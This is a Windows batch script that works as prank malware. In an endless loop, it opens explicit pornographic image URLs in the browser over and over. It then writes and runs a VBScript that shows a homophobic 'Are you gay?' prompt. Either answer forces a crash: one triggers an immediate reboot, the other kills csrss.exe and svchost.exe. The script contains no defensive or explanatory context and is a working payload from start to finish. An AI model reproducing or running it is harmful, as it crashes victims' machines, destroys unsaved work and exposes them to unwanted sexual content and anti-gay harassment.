@echo off
setlocal

set "link1=https://th.bing.com/th/id/R.f2a3d23ef23223423251aef97a6ff9d0?rik=3Z7TMIycdtqrUg&pid=ImgRaw&r=0"
set "link2=https://s1.pictoa.com/media/galleries/172/700/172700594c19c2e7b86/3264837594c19c3056c4.jpg"
set "link3=https://th.bing.com/th/id/R.20aa51afe49ebee80718a2f5819a1a1c?rik=v90ysVdCL6R7ig&pid=ImgRaw&r=0"
set "link4=https://s.smutty.com/media_smutty_2/d/t/g/a/b/dtgapethongboi-hvycw-56dacf.jpg"
set "link5=https://www.watchdudes.com/wp-content/uploads/2018/10/Straight-Men-Trade-Big-Cock-Pics-On-Snapchat-12.jpg"
set "link6=https://th.bing.com/th/id/R.5a7b2725364f015acb7090d17968423b?rik=5FjagwEKMiYV6Q&riu=http%3a%2f%2fi.smutty.com%2fmedia_smutty_2%2fo%2fu%2ft%2fd%2fp%2foutdoorsykind-yln8p-d02f52.jpg&ehk=Squ5ofcVVKUNO1qllC%2fMssDTSB1GxDYXkSErD525VTg%3d&risl=&pid=ImgRaw&r=0"
set "link7=https://thumb-lvlt.xhcdn.com/a/PCIC11VntIdbljale2G7hw/013/139/113/2000x2000.9.jpg"

:loop
for /l %%i in (1,1,10) do (
    start "" %link1%
    timeout /t 0.6 /nobreak > nul
    start "" %link2%
    timeout /t 0.6 /nobreak > nul
    start "" %link3%
    timeout /t 0.6 /nobreak > nul
    start "" %link4%
    timeout /t 0.6 /nobreak > nul
    start "" %link5%
    timeout /t 0.6 /nobreak > nul
    start "" %link6%
    timeout /t 0.6 /nobreak > nul
    start "" %link7%
    timeout /t 0.6 /nobreak > nul
)

echo Set objShell = CreateObject("WScript.Shell") > shutdown.vbs
echo userAnswer = MsgBox("Are you gay?", vbYesNo + vbQuestion, "lol!") >> shutdown.vbs
echo If userAnswer = vbYes Then >> shutdown.vbs
echo     objShell.Run "shutdown /r /f /t 0", 0, True >> shutdown.vbs
echo ElseIf userAnswer = vbNo Then >> shutdown.vbs
echo     Set objFSO = CreateObject("Scripting.FileSystemObject") >> shutdown.vbs
echo     Set objFile = objFSO.CreateTextFile("gay.bat", True) >> shutdown.vbs
echo     objFile.WriteLine("TASKKILL /IM csrss.exe /F") >> shutdown.vbs
echo     objFile.WriteLine("TASKKILL /IM svchost.exe /F") >> shutdown.vbs
echo     objFile.Close >> shutdown.vbs
echo     objShell.Run "gay.bat", 1, False >> shutdown.vbs
echo End If >> shutdown.vbs
echo WScript.Quit >> shutdown.vbs

cscript /nologo shutdown.vbs
del shutdown.vbs

goto loop

